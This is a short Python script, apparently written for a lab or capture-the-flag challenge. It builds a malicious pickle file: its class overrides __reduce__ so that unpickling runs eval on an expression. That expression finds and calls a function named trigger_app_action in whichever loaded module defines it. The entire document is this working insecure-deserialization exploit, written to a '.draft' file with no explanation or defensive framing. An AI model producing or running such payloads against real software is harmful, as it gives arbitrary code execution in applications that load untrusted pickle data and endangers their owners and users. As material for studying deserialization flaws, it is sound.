#!/usr/bin/env python3
import pickle

class Exploit:
    def __reduce__(self):
        # At unpickle time, Python will do eval(expr)
        expr = (
            # scan all loaded modules for any attribute named trigger_app_action,
            # then call it
            "(next(getattr(m,'trigger_app_action') "
            "for m in __import__('sys').modules.values() "
            "if hasattr(m,'trigger_app_action')))()"
        )
        return (eval, (expr,))

def make_exploit_draft(path='exploit_insecure_deserialization.draft'):
    payload = Exploit()
    with open(path, 'wb') as f:
        pickle.dump(payload, f)
    print(f"[+] Exploit draft written to {path}")

if __name__ == "__main__":
    make_exploit_draft()

